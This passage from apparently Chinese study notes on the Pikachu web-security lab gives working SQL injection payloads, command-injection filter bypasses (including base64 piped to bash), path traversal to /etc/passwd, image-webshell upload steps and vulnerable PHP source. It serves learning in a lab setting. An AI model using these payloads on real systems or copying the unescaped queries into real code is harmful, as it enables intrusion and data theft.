攻击来理解为什么Token能够有效</p><p>CSRF攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止CSRF攻击。</p><p>另一个更通用的做法是保持原有参数不变，另外添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。</p><p><strong>Token 使用原则</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Token要足够随机————只有这样才算不可预测</span><br><span class="line">Token是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度</span><br><span class="line">Token要注意保密性————敏感操作使用post，防止Token出现在URL中</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/iagwKEedYIApjRT.png"></p><h1 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql-inject"></a>sql-inject</h1><p>可以打一下sqli-libs~~~</p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>post、数字型：1 and 1=1 #正常回显；1 and 1=2 #非正常</p><p>如图</p><p><img src="https://i.loli.net/2021/02/13/pC2H5kLJMeocsWv.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1 order by 1,2#判断字段数</span><br><span class="line">id&#x3D;-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+#爆表名</span><br><span class="line">id&#x3D;-1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+#爆列名</span><br><span class="line">id&#x3D;-1 union select 1,group_concat(username,0x2b,password) from users--+#爆数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/tPZqCKzXlvcyROn.png"></p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>get、字符型：id=1’ #保错，id=1’ –+ # 正常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;1&#39; order by 2--+</span><br><span class="line">?name&#x3D;1&#39; union select 1,2--+</span><br><span class="line">?name&#x3D;-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+#爆表名</span><br><span class="line">?name&#x3D;-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+#爆列名</span><br><span class="line">?name&#x3D;-1&#39; union select 1,group_concat(username,0x2b,password) from users--+#爆数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/8m4BP6V2GSRJoig.png"></p><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>后端的sql查询语句使用了模糊差异如 <code>select id form 某表 like &#39; %xxx% &#39;</code></p><p>payload的构造：实际是将其通配符%闭合，</p><p>eg：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xx%&#39; or 1&#x3D;1 #   </span><br><span class="line"></span><br><span class="line">传到后端的完整语句为：select id form 某表 like &#39; %xx%&#39; or 1&#x3D;1 #% &#39;</span><br><span class="line"></span><br><span class="line">&#39; and 1&#x3D;1 and &#39;%&#39;&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">传到后端的完整语句为：select id form 某表 like &#39;%&#39; and 1&#x3D;1 and &#39;%&#39;&#x3D;&#39;%&#39;</span><br></pre></td></tr></table></figure><p>输入：’ and 1=1 and ‘%’=’</p><p>此时后端查询语句为：select name form 某表 like ‘%’ and 1=1 and ‘%’=’%’;like后的值都为1，故回显出此表的所有结果</p><p><img src="https://i.loli.net/2021/02/13/S2U5GDwlEnyYvM7.png"></p><p>这里没有回显位，盲注一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kobe&#39; and length(database())&#x3D;7 ##正常回显,数据库长度为7</span><br><span class="line">kobe&#39; and ord(substr(database(),1,1))&#x3D;112 #</span><br><span class="line">ord()返回括号内字符的asii码；substr(字符串,起始位置，字符数目)</span><br></pre></td></tr></table></figure><p>burpsuite一下：</p><p><img src="https://i.loli.net/2021/02/14/YLkPq2fuAZr6UFK.png"></p><p>112 105 107 97 99 104 117   =》 p i k a c h u</p><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>tip:管tmd的什么型,能够制造出闭合,就是本事</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;1&#39;) --+</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/HI5VlwvXSx4zM9a.png"></p><h2 id="insert-update注入"><a href="#insert-update注入" class="headerlink" title="insert/update注入"></a>insert/update注入</h2><p>insert语句：在数据库中添加数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">两种形式：</span><br><span class="line">1.INSERT...VALUES：</span><br><span class="line">insert into &lt;表名&gt; [&lt;列名1&gt; [ , ...&lt;列名n&gt;]]</span><br><span class="line">values (值1) [... , (值n) ];</span><br><span class="line"></span><br><span class="line">2.INSERT...SET：</span><br><span class="line">insert into &lt;表名&gt;</span><br><span class="line">set &lt;列名1&gt; &#x3D; &lt;值1&gt;</span><br><span class="line">&lt;列名2&gt; &#x3D; &lt;值2&gt;</span><br><span class="line">...;</span><br></pre></td></tr></table></figure><p>update语句：修改、更新数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update &lt;表名&gt; set 字段 1 &#x3D; 值 1 [,字段 2 &#x3D; 值 2… ] [where 子句 ]</span><br><span class="line">[order by 子句] [limit 子句];</span><br></pre></td></tr></table></figure><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>注册页面</p><p><img src="https://i.loli.net/2021/02/14/oUadxHfnustVOGp.png"></p><p>则猜测后端语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 某表  (username,password,sex,phonenumber,address,home?) values (&#39;xxx&#39;,&#39;xxx&#39;,&#39;xxx&#39;,xxx,&#39;xxx&#39;,&#39;xxx&#39;);</span><br></pre></td></tr></table></figure><p>xxx即为我们输入的值，存在报错，构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxx&#39; or (select updatexml(1,concat (0x7e,(select database()),0x7e),1)) or &#39;</span><br><span class="line">xxx&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</span><br><span class="line"></span><br><span class="line">因为存在两个必填项，必须在末尾加&#39;构造闭合，使得报错不是语法错误</span><br></pre></td></tr></table></figure><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p><img src="https://i.loli.net/2021/02/14/AqXZrg4VyFERtKG.png"></p><p>猜测后端语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 某表 set sex &#x3D; &#39;xxx&#39;, phone &#x3D; &#39;xxx&#39;, add &#x3D; &#39;xxx&#39;, email &#x3D; &#39;xxx&#39; where name &#x3D;&#39;123&#39;;</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span>=connect();</span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="keyword">if</span>(!check_sqli_session(<span class="variable">$link</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录后才能进入会员中心哦&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    header(<span class="string">&quot;location:sqli_login.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$html1</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sex&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;phonenum&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;add&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//        $getdata=escape($link, $_POST);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//未转义,形成注入,sql操作类型为update</span></span><br><span class="line">        <span class="variable">$getdata</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;update member set sex=&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,phonenum=&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,address=&#x27;<span class="subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;,email=&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27; where username=&#x27;<span class="subst">&#123;$_SESSION[&#x27;sqli&#x27;][&#x27;username&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=execute(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(mysqli_affected_rows(<span class="variable">$link</span>)==<span class="number">1</span> || mysqli_affected_rows(<span class="variable">$link</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            header(<span class="string">&quot;location:sqli_mem.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html1</span>.=<span class="string">&#x27;修改失败，请重试&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>构造报错型注入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; or (select updatexml(1,concat(0x7e,(select database()),0x7e),1)) #</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/E8g23vRF1aOd6Km.png"></p><p><img src="https://i.loli.net/2021/02/14/9kFpNlBRWiQqsKu.png"></p><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p>delete语句：删除数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from &lt;表名&gt; [where 子句] [order by 子句] [limit 子句]</span><br></pre></td></tr></table></figure><p>点击删除=》传参作为删除的筛选条件</p><p>猜测后端为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from 某表 where id &#x3D; xxx</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/k4DNhlxXSQ9arbd.png"></p><p>可以看到参数：<code>id=62</code></p><p>在其后加上payload即可~(此处仍为报错注入)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or (select updatexml(1,concat(0x7e,(select database()),0x7e),1)) #</span><br></pre></td></tr></table></figure><p>注：payload需进行html编码=》选中然后ctrl+u即可</p><p><img src="https://i.loli.net/2021/02/14/mwJIPvWHoMFy68Z.png"></p><h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><p>http头注入的原理是前端获取参数值，然后将参数拼接到select语句中查询。即与数据库产生交互。</p><p>著需要找到http头中传参的地方，将payload输入即可</p><p>如图：显示头部信息user-agent、accept</p><p><img src="https://i.loli.net/2021/02/14/Fb2GILVsH9SKB5M.png"></p><p>payload(此处仍是报错注入)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&#39; or (select updatexml(1,concat (0x7e,(select database()),0x7e),1)) or &#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/lUASyjYzIXb7B3J.png"></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔即true与false；结果正确与错误显示的页面不同，则猜测有布尔注入</p><p>判断：输入kobe正常回显，输入kobe’ and 1# 正常回显kobe信息；输入kobe’ and 0#  不存在</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kobe&#39; and length(database())&#x3D;7# </span><br><span class="line">kobe&#39; and ord(substr(database(),1,1))&#x3D;112# </span><br><span class="line">#burpsuite跑一下即可，消息操作看搜索型注入部分</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>利用<code>sleep()</code>或<code>benchmark()</code>等函数使得命令执行时间变长，与<code>if(expr1,expr2,expr3)</code>搭配使用猜解数据库</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe&#39; and if (length ( database() ) &#x3D;7 , sleep(5) , 1) #</span><br><span class="line">kobe&#39; and if (ord(substr(database(),1,1))&#x3D;112 , sleep(5) , 1) #</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>适用：单引号被反斜杠转义&amp;&amp;数据库使用GBK编码(PHP中通过iconv()进行编码转换也可能存在宽字节字符注入)</p><blockquote><p>eg:<br>比如输入的id被 ‘包围，输入id=1’，程序不报错，但会多出一个反斜杠(id= ‘1&#39;‘)，此时输入的单引号被反斜杠转义，从而导致输入的单引号无法形成闭合。通常这种情况下此处是不存在sql注入漏洞的。<br>但数据库查询前执行了SET NAMES ‘GBK’语句，会将编码设置为宽字节GBK。造成此处的宽字节漏洞。</p></blockquote><p>原理：反斜杠编码为<code>%5c</code>，GBK编码中<code>%df%5c</code>为繁体字<code>運</code>,由此可绕过反斜杠转义 </p><p>利用：宽字节<code>%df</code>加<code>&#39;</code></p><p><img src="https://i.loli.net/2021/02/14/c4a8OsJQV3nrCYb.png"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>RCE即remote command/code execute让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p>以下摘自<a href="https://www.cnblogs.com/SpouseLJ/p/13223967.html">CTF下的命令执行漏洞利用及绕过方法总结</a></p><p>管道符：</p><p>windows：<code>| </code>、<code>||</code> 、<code>&amp;</code>、<code>&amp;&amp;</code></p><p>linux：相比windows多了一个<code>;</code>,效果同<code>&amp;</code></p><p><code>|</code>：直接执行<code>|</code>后的语句</p><p><img src="https://i.loli.net/2021/02/14/fPMCoi2vwrZLqEG.png"></p><p><code>||</code> : 取决于<code>||</code>前的命令正确与否：正确 =》只执行前面的语句；错误 =》执行后面的语句</p><p><img src="https://i.loli.net/2021/02/14/Lnb3di6JRCX1ewO.png"></p><p><code>&amp;</code>：<code>&amp;</code>前后的命令都执行，无论前者是否正确</p><p><img src="https://i.loli.net/2021/02/14/YkzPoEb6XSRrUiQ.png"></p><p><code>&amp;&amp;</code>：<code>&amp;&amp;</code>前命令为假则都不执行，为真则都执行</p><p><img src="https://i.loli.net/2021/02/14/5a1YThQz7Kj3GpN.png"></p><p>bypass：</p><p>过滤空格bypass：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.&#123;IFS&#125;</span><br><span class="line">2.&lt;&gt;</span><br><span class="line">3.PHP环境下%09</span><br></pre></td></tr></table></figure><p>黑名单bypass：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">拼接：a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</span><br><span class="line">编码：Y2F0IGZsYWc&#x3D; 即 cat flag</span><br><span class="line">echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d|bash</span><br><span class="line">&#96;echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d&#96;</span><br><span class="line">单、双引号：c&quot;&quot;at fl&#39;&#39;ag</span><br><span class="line">反斜线：c\at fl\ag</span><br><span class="line">$1、$2...以及$@:c$1at fl$@ag</span><br><span class="line">内联执行绕过：&#96;命令&#96;和$(命令)都是执行命令的方式</span><br><span class="line">echo &quot;xx&#96;pwd&#96;&quot;</span><br><span class="line">echo &quot;xx$(pwd)&quot;</span><br><span class="line">通配符绕过：以下指令等同 &#x2F;bin&#x2F;cat flag</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">&#x2F;???&#x2F;?at flag</span><br><span class="line">&#x2F;???&#x2F;?at ????</span><br><span class="line">&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure><p>更多的内容看这里=&gt;<a href="https://www.cnblogs.com/SpouseLJ/p/13223967.html">CTF下的命令执行漏洞利用及绕过方法总结</a></p><h2 id="exec”ping”"><a href="#exec”ping”" class="headerlink" title="exec”ping”"></a>exec”ping”</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 | whoami</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/M9k8h3ZyaPz5DBN.png"></p><h2 id="exec”evel”"><a href="#exec”evel”" class="headerlink" title="exec”evel”"></a>exec”evel”</h2><p>eval()函数危害极大，甚至可以直接拿shell</p><p><img src="https://i.loli.net/2021/02/14/9JUbsZ4PAxjdXF2.png"></p><p><img src="https://i.loli.net/2021/02/14/NYsG9ku7M8IWQ1H.png"></p><h1 id="File-inclusion"><a href="#File-inclusion" class="headerlink" title="File inclusion"></a>File inclusion</h1><blockquote><p>概述：</p><p>File inclusion 文件包含：在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。</p><p>PHP中，提供了：<br>include(),include_once()<br>require(),require_once()</p><p>当文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。</p></blockquote><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>后端代码通过include()，包含本地文件输出内容，其参数由GET传入，可以任意控制包含的文件</p><p>环境要求：allow_url_fopen=On</p><p><img src="https://i.loli.net/2021/02/14/14SRghwUCQpM8yO.png"></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>网站错误的将环境配置打开<code>allow_url_include=On</code>(默认关闭)，导致攻击者可以加载远程文件，攻击者搭建一个服务器，通过PHP代码写入一句话木马，导致任意命令执行getshell。</p><p>环境要求：allow_url_fopen=On 、allow_url_include=On</p><p>将文件上传到某网站上然后复制路径到参数即可</p><p><img src="https://i.loli.net/2021/02/14/vuKoXnGd5lTkpCS.png"></p><h1 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h1><p>网站提供文件下载功能,用户点击下载链接，将文件路径传给后台进行处理，当文件下载功能设计不当,则可能导致攻击者可以构造文件路径,从而获取到后台服务器上的其他的敏感文件。</p><blockquote><p>概述：文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。</p><p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p><p>防护：对传入的文件名进行严格的过滤和限定，对文件下载目录进行严格限定</p></blockquote><p><img src="https://i.loli.net/2021/02/14/ibeYnm19rMfz2sI.png"></p><p><img src="https://i.loli.net/2021/02/14/io6tMa83CvqN7PO.png"></p><p>此处未对文件路径限制，修改下载文件路径就会造成任意文件下载</p><p>如将路径更改为…/…/…/…/…/etc/passwd</p><h1 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a>不安全的文件上传</h1><p>可以打一下upload-libs~~~</p><blockquote><p>概述：文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。</p><p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等…</p></blockquote><h2 id="client-check-客户端检查"><a href="#client-check-客户端检查" class="headerlink" title="client check(客户端检查)"></a>client check(客户端检查)</h2><p>在前端进行验证，要求只能上传图片。</p><p>bypass：1.将文件后缀修改符合前端要求，再抓包改回来即可。2.禁用js</p><p><img src="https://i.loli.net/2021/02/14/IQp3GW4c6diUlsx.png"></p><h2 id="MIME-type-服务端检查"><a href="#MIME-type-服务端检查" class="headerlink" title="MIME type(服务端检查)"></a>MIME type(服务端检查)</h2><p>MIME type:媒体类型，如图片可能为image/jpeg，应用可能为application/octet-stream</p><p>此处只对文件类型进行验证，将application/octet-stream改为image/jpeg即可</p><p><img src="https://i.loli.net/2021/02/14/xMNwR8mlBVJE3kW.png"></p><p><img src="https://i.loli.net/2021/02/14/tbSnw6BFTmi5oh9.png"></p><p>找到文件路径，访问即可</p><p><img src="https://i.loli.net/2021/02/14/zRL4Tac2xZ8evt3.png"></p><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h2><p>getimagesize()：获取图像信息，返回文件大小和文件类型。将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p><p>会在服务器对图片信息进行验证</p><p>上传图片马</p><p><img src="https://i.loli.net/2021/02/14/LHtnj2JuaUR4D6g.png"></p><p>然后使用文件包含漏洞包含该路径即可</p><p>图片马:</p><ol><li>准备一张图片 xxx1.jpg 和 一句话php木马 xxx2.php</li><li>在两文件路径打开CMD copy xxx2.php/b+xxx1.jpg  hhh.jpg</li></ol><p><img src="https://i.loli.net/2021/02/14/vrZdfAyC97i8z61.png"></p><p>也可以用hxd或者010editior打开xxx1，将xxx2内容插入到末尾</p><h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><blockquote><p>概述：如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。</p><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p><p>因此，在在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p><p>你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>两用户拥有同级权限，但只能操作自己的信息。若A用户能实现对B用户的信息操作，这种同级别的越权行为称之为水平越权。</p><p>登陆后点击查看个人信息<img src="https://i.loli.net/2021/02/14/mRg3BkwIYEQVFHO.png"></p><p>url中参数username=lucy更改=》kobe；实现越权</p><p><img src="https://i.loli.net/2021/02/14/7Ccw96tfFJHk8QA.png"></p><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>A用户权限高于B用户，B用户越权操作A用户，这种低权限用户越权操作高权限用户的行为称之为垂直越权。</p><p>有两个用户：pikachu/000000;admin/123456（admin为管理员）</p><p>pikachu作为普通用户只有查看权限</p><p>admin作为管理员用户可以添加和删除用户</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="variable">$link</span>=connect();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!check_op2_login(<span class="variable">$link</span>))&#123;</span><br><span class="line">    header(<span class="string">&quot;location:op2_login.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="literal">null</span>)&#123;<span class="comment">//用户名密码必填</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$getdata</span>=escape(<span class="variable">$link</span>, <span class="variable">$_POST</span>);<span class="comment">//转义</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;<span class="subst">&#123;$getdata[&#x27;username&#x27;]&#125;</span>&#x27;,md5(&#x27;<span class="subst">&#123;$getdata[&#x27;password&#x27;]&#125;</span>&#x27;),&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;address&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p><img 